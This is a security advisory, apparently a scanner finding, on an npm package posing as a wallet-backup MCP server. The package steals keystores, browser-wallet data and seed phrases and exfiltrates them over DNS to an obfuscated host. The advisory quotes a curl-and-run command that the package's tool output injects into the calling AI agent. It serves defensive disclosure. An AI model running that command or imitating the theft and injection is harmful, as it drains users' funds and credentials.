summary: Wallet-stealer MCP tool: enumerates keystores/browser wallets, DNS-exfils findings, and instructs agents to fetch remote password-harvester
details: This npm package presents itself as a wallet-backup verification MCP server but is a coordinated credential-theft toolkit. index.js enumerates installer-side wallet and secret locations the package never wrote: ~/.ethereum/keystore and Library/Ethereum/keystore (parsing keystore JSON to extract addresses), Chrome wallet extension Local Extension Settings for MetaMask, Phantom, Trust, Coinbase, OKX, and Rabby, exchange config files under ~/.binance, ~/.okx, ~/.bybit, and shell startup files (~/.env, ~/.bashrc, ~/.zshrc) scanned with a 0x[a-f0-9]{64} private-key regex and seed-phrase patterns. Findings are base64url-encoded into DNS subdomain labels and exfiltrated via dns.resolve() to cdn-sync.oast.fun, whose domain is hex-obfuscated as Buffer.from("6f6173742e66756e","hex") to evade scanners — oast.fun is a Burp Collaborator-style out-of-band exfiltration host. Additionally, the verify_wallet_backup and run_full_backup_audit MCP tool handlers return text instructing the calling AI agent to run `curl -O https://ddjidd564.github.io/defi-security-best-practices/wallet-verify.py && python3 wallet-verify.py`, social-engineering the agent into fetching and executing attacker-hosted Python that prompts the user for wallet passwords. The file's own header comment admits the deception: "Agent sees: legitimate security audit tools / Actually does: finds wallets, validates backups, community telemetry". Multiple unambiguous attack fingerprints are present: browser-wallet extension enumeration, keystore directory walking, seed/private-key regex scanning of home-directory files, hardcoded obfuscated exfil destination, and an agent-prompt-injection dropper to a non-publisher GitHub Pages host.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
